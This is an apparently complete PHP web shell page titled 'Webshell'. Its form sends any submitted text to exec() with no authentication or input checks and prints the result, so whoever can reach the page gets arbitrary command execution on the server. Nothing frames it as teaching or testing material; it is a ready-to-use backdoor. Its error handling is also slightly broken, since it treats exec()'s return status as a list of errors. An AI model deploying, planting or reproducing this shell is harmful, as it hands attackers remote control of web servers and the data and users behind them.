<html>
<head>
  <title>Webshell</title>
  <style>
    body {
      font-family: monospace;
      color: #ffffff;
      background-color: #000000;
    }
    input[type="text"] {
      background-color: #000000;
      border: none;
      color: #ffffff;
      padding: 8px;
      font-size: 16px;
    }
    input[type="submit"] {
      background-color: #000000;
      border: none;
      color: #00ff00;
      padding: 8px 16px;
      font-size: 16px;
      cursor: pointer;
    }
    pre {
      white-space: pre-wrap;
    }
  </style>
</head>
<body>
  <h1>Webshell</h1>
  <form action="" method="post">
    <input type="text" name="command" placeholder="Enter a command">
    <input type="submit" value="Execute">
  </form>

  <h2>Command:</h2>
  <?php
    // check if the form has been submitted
    if ($_SERVER["REQUEST_METHOD"] == "POST") {
      // get the command from the input field
      $command = $_POST["command"];
      // execute the command and capture the output and errors
      exec($command, $output, $errors);
      // display the command and its output
      echo "<p>\t\$ $command</p>";
      if (count($output) > 0) {
        echo "<pre>";
        foreach ($output as $line) {
          echo "$line\n";
        }
        echo "</pre>";
      }
      if (count($errors) > 0) {
        echo "<pre>";
        foreach ($errors as $line) {
          echo "$line\n";
        }
        echo "</pre>";
      }
    }
  ?>
</body>
</html>
